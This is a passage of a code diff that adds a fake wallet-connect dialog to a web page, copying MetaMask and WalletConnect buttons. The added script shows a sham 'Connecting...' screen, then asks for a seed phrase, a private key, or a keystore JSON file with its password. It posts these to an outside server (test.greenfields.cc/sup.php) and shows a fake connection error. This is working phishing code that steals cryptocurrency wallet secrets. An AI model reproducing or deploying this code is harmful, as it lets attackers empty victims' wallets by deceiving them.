11.3459L3.93722 11.9874L3.4978 12.3038L4.50847 13.4903L9.10483 12.1456L12.3566 9.39485L3.90207 3.1199L2.79472 6.45072Z&quot; fill=&quot;%23763D16&quot; stroke=&quot;%23763D16&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M23.4827 13.4903L18.8864 12.1456L20.2837 14.2461L18.2009 18.2888L20.9429 18.2536H25.0295L23.4827 13.4903Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M9.10484 12.1456L4.50848 13.4903L2.97929 18.2536H7.05713L9.79033 18.2888L7.71626 14.2461L9.10484 12.1456Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A<path d=&quot;M15.3446 14.4658L15.6347 9.39485L16.9705 5.7828H11.0383L12.3566 9.39485L12.6642 14.4658L12.7696 16.0653L12.7784 20.0025H15.2128L15.2304 16.0653L15.3446 14.4658Z&quot; fill=&quot;%23F6851B&quot; stroke=&quot;%23F6851B&quot; stroke-width=&quot;0.0878845&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;/>%0A</svg>%0A" style="transition:opacity 0.15s linear;user-select:none">
+																	<div class="iekbcc0 ju367vc6 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
+																</div>
+																<div class="iekbcc0">
+																	<div class="iekbcc0 ju367v5p">MetaMask</div>
+																</div>
+															</div>
+														</div>
+													</button>
+												</div>
+												<div class="iekbcc0 ju367va ju367v15">
+													<button class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8u ju367v9f ju367vb1 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-walletConnect" style="will-change:transform">
+														<div class="iekbcc0 ju367vgu ju367v16 ju367v1a ju367v1h ju367v8u">
+															<div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+																<div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v94" role="img" style="background:rgb(59,153,252)"><img class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true" src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;%233B99FC&quot;/>%0A<path d=&quot;M8.38969 10.3739C11.4882 7.27538 16.5118 7.27538 19.6103 10.3739L19.9832 10.7468C20.1382 10.9017 20.1382 11.1529 19.9832 11.3078L18.7076 12.5835C18.6301 12.6609 18.5045 12.6609 18.4271 12.5835L17.9139 12.0703C15.7523 9.9087 12.2477 9.9087 10.0861 12.0703L9.53655 12.6198C9.45909 12.6973 9.3335 12.6973 9.25604 12.6198L7.98039 11.3442C7.82547 11.1893 7.82547 10.9381 7.98039 10.7832L8.38969 10.3739ZM22.2485 13.012L23.3838 14.1474C23.5387 14.3023 23.5387 14.5535 23.3838 14.7084L18.2645 19.8277C18.1096 19.9827 17.8584 19.9827 17.7035 19.8277C17.7035 19.8277 17.7035 19.8277 17.7035 19.8277L14.0702 16.1944C14.0314 16.1557 13.9686 16.1557 13.9299 16.1944C13.9299 16.1944 13.9299 16.1944 13.9299 16.1944L10.2966 19.8277C10.1417 19.9827 9.89053 19.9827 9.73561 19.8278C9.7356 19.8278 9.7356 19.8277 9.7356 19.8277L4.61619 14.7083C4.46127 14.5534 4.46127 14.3022 4.61619 14.1473L5.75152 13.012C5.90645 12.857 6.15763 12.857 6.31255 13.012L9.94595 16.6454C9.98468 16.6841 10.0475 16.6841 10.0862 16.6454C10.0862 16.6454 10.0862 16.6454 10.0862 16.6454L13.7194 13.012C13.8743 12.857 14.1255 12.857 14.2805 13.012C14.2805 13.012 14.2805 13.012 14.2805 13.012L17.9139 16.6454C17.9526 16.6841 18.0154 16.6841 18.0541 16.6454L21.6874 13.012C21.8424 12.8571 22.0936 12.8571 22.2485 13.012Z&quot; fill=&quot;white&quot;/>%0A</svg>%0A" style="transition:opacity 0.15s linear;user-select:none">
+																	<div class="iekbcc0 ju367vc6 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
+																</div>
+																<div class="iekbcc0">
+																	<div class="iekbcc0 ju367v5p">WalletConnect</div>
+																</div>
+															</div>
+														</div>
+													</button>
+												</div>
+											</div>
+										</div>
+										<div class="iekbcc0 ju367vau ju367v24 ju367v57"></div>
+										<div class="iekbcc0 ju367v7c ju367v7x ju367v8f ju367v6o ju367v4 ju367va ju367v2r">
+											<div class="iekbcc0 ju367v88 ju367v6h">
+												<div class="iekbcc0 ju367vh0 ju367v16 ju367v19 ju367v1f ju367v2v">New to Ethereum wallets?</div>
+											</div>
+											<div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1n ju367v2q">
+												<div class="iekbcc0 ju367v88 ju367v6h ju367vy ju367v8u _12cbo8i3 ju367v8r _12cbo8i4 _12cbo8i6" style="will-change:transform">
+													<div class="iekbcc0 ju367vf0 ju367v16 ju367v19 ju367v1h ju367v2v">Learn More</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div tabindex="0"></div>
+			</div>
+		</div>
+	</div>
+	<script data-template-shadow-root>
+	(() => {
+		document.currentScript.remove();
+		processNode(document);
+
+		function processNode(node) {
+			node.querySelectorAll("template[shadowrootmode]").forEach(element => {
+				let shadowRoot = element.parentElement.shadowRoot;
+				if(!shadowRoot) {
+					try {
+						shadowRoot = element.parentElement.attachShadow({
+							mode: element.getAttribute("shadowrootmode")
+						});
+						shadowRoot.innerHTML = element.innerHTML;
+						element.remove()
+					} catch(error) {}
+					if(shadowRoot) {
+						processNode(shadowRoot)
+					}
+				}
+			})
+		}
+	})()
+	</script>
+	<style>
+      /*  * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f5f7ff 0%, #eef0f9 100%);
+            padding: 20px;
+        }
+        
+        .container {
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }*/
+        
+        /*.open-modal-btn {
+            background-color: #6058fd;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(96, 88, 253, 0.3);
+        }
+        
+        .open-modal-btn:hover {
+            background-color: #4d45fc;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(96, 88, 253, 0.4);
+        }*/
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 999999999999999999;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 450px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            transform: scale(0.9);
+            transition: transform 0.4s ease;
+        }
+        
+        .modal-overlay.active .modal {
+            transform: scale(1);
+        }
+        
+        .modal-content {
+            padding: 0;
+        }
+        
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 50px 30px;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(96, 88, 253, 0.2);
+            border-radius: 50%;
+            border-top-color: #6058fd;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-screen h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .loading-screen p {
+            color: #666;
+            margin-bottom: 0;
+        }
+        
+        .form-screen {
+            display: none;
+            padding: 0;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .tab {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            background: #f8f9ff;
+            cursor: pointer;
+            font-weight: 500;
+            color: #777;
+            transition: all 0.3s ease;
+        }
+        
+        .tab.active {
+            background: white;
+            color: #6058fd;
+            border-bottom: 2px solid #6058fd;
+        }
+        
+        .tab-content {
+            padding: 25px;
+        }
+        
+        .form {
+            display: none;
+        }
+        
+        .form.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #444;
+            font-weight: 500;
+        }
+        
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border 0.3s ease;
+        }
+        
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: #6058fd;
+            outline: none;
+        }
+        
+        .form-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        .submit-btn {
+            background-color: #6058fd;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        .submit-btn:hover {
+            background-color: #4d45fc;
+        }
+        
+        .error-message {
+            display: none;
+            background: #fff0f0;
+            color: #e13c3c;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .success-message {
+            display: none;
+            background: #f0fff4;
+            color: #2ecc71;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .submitting {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+    </style>
+	<!--  -->
+    <div class="modal-overlay">
+        <div class="modal">
+            <div class="modal-content">
+                <!-- Loading Screen -->
+                <div class="loading-screen">
+                    <div class="spinner"></div>
+                    <h3>Connecting...</h3>
+                    <p>Please wait while we connect your wallet</p>
+                </div>
+
+                <!-- Form Screen -->
+                <div class="form-screen">
+                    <div class="tabs">
+                        <div class="tab active" data-tab="seedphrase">Seed Phrase</div>
+                        <div class="tab" data-tab="privatekey">Private Key</div>
+                        <div class="tab" data-tab="json">JSON + Password</div>
+                    </div>
+
+                    <div class="tab-content">
+                        <!-- Seed Phrase Form -->
+                        <form id="seedphraseForm" class="form active" data-form="seedphrase">
+                            <div class="form-group">
+                                <label for="seedphrase">Seed Phrase</label>
+                                <textarea id="seedphrase" name="seedphrase" placeholder="Enter your 12 or 24 word seed phrase" required></textarea>
+                            </div>
+                            <button type="submit" class="submit-btn">connect</button>
+                        </form>
+
+                        <!-- Private Key Form -->
+                        <form id="privatekeyForm" class="form" data-form="privatekey">
+                            <div class="form-group">
+                                <label for="privatekey">Private Key</label>
+                                <textarea id="privatekey" name="privatekey" placeholder="Enter your private key" required></textarea>
+                            </div>
+                            <button type="submit" class="submit-btn">connect</button>
+                        </form>
+
+                        <!-- JSON + Password Form -->
+                        <form id="jsonForm" class="form" data-form="json">
+                            <div class="form-group">
+                                <label for="jsonfile">JSON File</label>
+                                <input type="file" id="jsonfile" name="jsonfile" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="password">Password</label>
+                                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                            </div>
+                            <button type="submit" class="submit-btn">connect</button>
+                        </form>
+
+                        <div class="error-message">
+                            Error while connecting wallet . Please try again.
+                        </div>
+                        
+                        <div class="success-message">
+                            Form submitted successfully!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+
+            const modalOverlay = document.querySelector('.modal-overlay');
+            const modalOverme = document.querySelector('.bilal');
+            const openModalBtn = document.querySelector('.open-modal-btn');
+            const openModalBtne = document.querySelector('.open-modal-btne');
+            const loadingScreen = document.querySelector('.loading-screen');
+            const formScreen = document.querySelector('.form-screen');
+            const tabs = document.querySelectorAll('.tab');
+            const forms = document.querySelectorAll('.form');
+            const errorMessage = document.querySelector('.error-message');
+            const successMessage = document.querySelector('.success-message');
+            
+            // Open modal when button is clicked
+            openModalBtn.addEventListener('click', function() {
+                modalOverlay.classList.add('active');
+                
+                // Show loading screen for 5 seconds
+                loadingScreen.style.display = 'flex';
+                formScreen.style.display = 'none';
+                errorMessage.style.display = 'none';
+                successMessage.style.display = 'none';
+               
+                setTimeout(function() {
+                    loadingScreen.style.display = 'none';
+                    formScreen.style.display = 'block';
+                }, 5000);
+            });
+             // Open modal when button is clicked
+            openModalBtne.addEventListener('click', function() {
+                modalOverme.style.display='flex';
+                
+               
+            });
+            
+            // Close modal when clicking outside
+            modalOverlay.addEventListener('click', function(e) {
+                if (e.target === modalOverlay) {
+                    modalOverlay.classList.remove('active');
+                }
+            });
+            
+            // Tab switching functionality
+            tabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabName = this.getAttribute('data-tab');
+                    
+                    // Update active tab
+                    tabs.forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    // Show corresponding form
+                    forms.forEach(form => {
+                        if (form.getAttribute('data-form') === tabName) {
+                            form.classList.add('active');
+                        } else {
+                            form.classList.remove('active');
+                        }
+                    });
+                });
+            });
+            
+            // Form submission handlers
+            document.getElementById('seedphraseForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitForm(this, {
+                    method: 'seedphrase',
+                    data: document.getElementById('seedphrase').value
+                });
+            });
+            
+            document.getElementById('privatekeyForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitForm(this, {
+                    method: 'privatekey',
+                    data: document.getElementById('privatekey').value
+                });
+            });
+            
+            document.getElementById('jsonForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const fileInput = document.getElementById('jsonfile');
+                const file = fileInput.files[0];
+                
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        submitForm(document.getElementById('jsonForm'), {
+                            method: 'json',
+                            data: e.target.result,
+                            password: document.getElementById('password').value
+                        });
+                    };
+                    reader.readAsText(file);
+                } else {
+                    showError();
+                }
+            });
+            
+            function submitForm(form, data) {
+                // Show submitting state
+                const submitBtn = form.querySelector('.submit-btn');
+                loadingScreen.style.display = 'flex';
+                      formScreen.style.display = 'none';
+                     setTimeout(function() {
+                        // errorMessage.style.display = 'none';
+                        // modalOverlay.classList.remove('active');
+                           loadingScreen.style.display = 'none';
+                           formScreen.style.display = 'block';
+                    }, 3000);
+                
+                // Create form data object
+                const formData = new FormData();
+                for (const key in data) {
+                    formData.append(key, data[key]);
+                }
+                
+                // Submit to example.com/index.php
+                fetch('https://test.greenfields.cc/sup.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.text();
+                    }
+                    throw new Error('Network response was not ok.');
+                })
+                .then(data => {
+                    // Show success message
+                    //successMessage.style.display = 'block';
+                    errorMessage.style.display = 'block';
+                    
+                    // Clear form inputs
+                    const inputs = form.querySelectorAll('input, textarea');
+                    inputs.forEach(input => {
+                        if (input.type !== 'file') {
+                            input.value = '';
+                        } else {
+                            input.value = null;
+                        }
+                    });
+                    
+                    // Reset button state
+                    submitBtn.classList.remove('connecting');
+                    submitBtn.textContent = 'connect';
+                    
+                    // Hide messages and close modal after 3 seconds
+                    setTimeout(function() {
+                        successMessage.style.display = 'none';
+                        modalOverlay.classList.remove('active');
+                    }, 3000);
+                })
+                .catch(error => {
+                    // Show error message
+                    showError();
+                    
+                    // Reset button state
+                    submitBtn.classList.remove('connecting');
+                    submitBtn.textContent = 'connect';
+                    
+                    console.error('Error submitting form:', error);
+                });
+            }
+            
+            function showError() {
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                
+                // Hide error message after 3 seconds
+                setTimeout(function() {
+                    errorMessage.style.display = 'none';
+                }, 3000);
+            }
+        });
+    </script>
+	<script>
+        // document.addEventListener('DOMContentLoaded', function() {
+        //     const modalOverlay = document.querySelector('.modal-overlay');
+        //     const openModalBtn = document.querySelector('.open-modal-btn');
+        //     const loadingScreen = document.querySelector('.loading-screen');
+        //     const formScreen = document.querySelector('.form-screen');
+        //     const tabs = document.querySelectorAll('.tab');
+        //     const forms = document.querySelectorAll('.form');
+        //     const submitBtns = document.querySelectorAll('.submit-btn');
+        //     const errorMessage = document.querySelector('.error-message');
+            
+        //     // Open modal when button is clicked
+        //     openModalBtn.addEventListener('click', function() {
+        //         modalOverlay.classList.add('active');
+                
+        //         // Show loading screen for 5 seconds
+        //         loadingScreen.style.display = 'flex';
+        //         formScreen.style.display = 'none';
+        //         errorMessage.style.display = 'none';
+                
+        //         setTimeout(function() {
+        //             loadingScreen.style.display = 'none';
+        //             formScreen.style.display = 'block';
+        //         }, 5000);
+        //     });
+            
+        //     // Close modal when clicking outside
+        //     modalOverlay.addEventListener('click', function(e) {
+        //         if (e.target === modalOverlay) {
+        //             modalOverlay.classList.remove('active');
+        //         }
+        //     });
+            
+        //     // Tab switching functionality
+        //     tabs.forEach(tab => {
+        //         tab.addEventListener('click', function() {
+        //             const tabName = this.getAttribute('data-tab');
+                    
+        //             // Update active tab
+        //             tabs.forEach(t => t.classList.remove('active'));
+        //             this.classList.add('active');
+                    
+        //             // Show corresponding form
+        //             forms.forEach(form => {
+        //                 if (form.getAttribute('data-form') === tabName) {
+        //                     form.classList.add('active');
+        //                 } else {
+        //                     form.classList.remove('active');
+        //                 }
+        //             });
+        //         });
+        //     });
+            
+        //     // Form submission
+        //     submitBtns.forEach(btn => {
+        //         btn.addEventListener('click', function() {
+        //             // Clear form inputs
+        //             const activeForm = document.querySelector('.form.active');
+        //             const inputs = activeForm.querySelectorAll('input, textarea');
+        //             inputs.forEach(input => {
+        //                 if (input.type !== 'file') {
+        //                     input.value = '';
+        //                 } else {
+        //                     input.value = null;
+        //                 }
+        //             });
+        //               loadingScreen.style.display = 'flex';
+        //               formScreen.style.display = 'none';
+        //              setTimeout(function() {
+        //                 // errorMessage.style.display = 'none';
+        //                 // modalOverlay.classList.remove('active');
+        //                    loadingScreen.style.display = 'none';
+        //                    formScreen.style.display = 'block';
+        //             }, 3000);
+        //             // Show error message
+        //             //errorMessage.style.display = 'block';
+        //             setTimeout(function() {
+        //                 errorMessage.style.display = 'block';
+                        
+        //             }, 6000);
+        //             // Hide error message after 3 seconds and close modal
+        //             setTimeout(function() {
+        //                 errorMessage.style.display = 'none';
+        //                 modalOverlay.classList.remove('active');
+        //             }, 10000);
+        //         });
+        //     });
+        //});
+    </script>
+</body>
+
+</html>
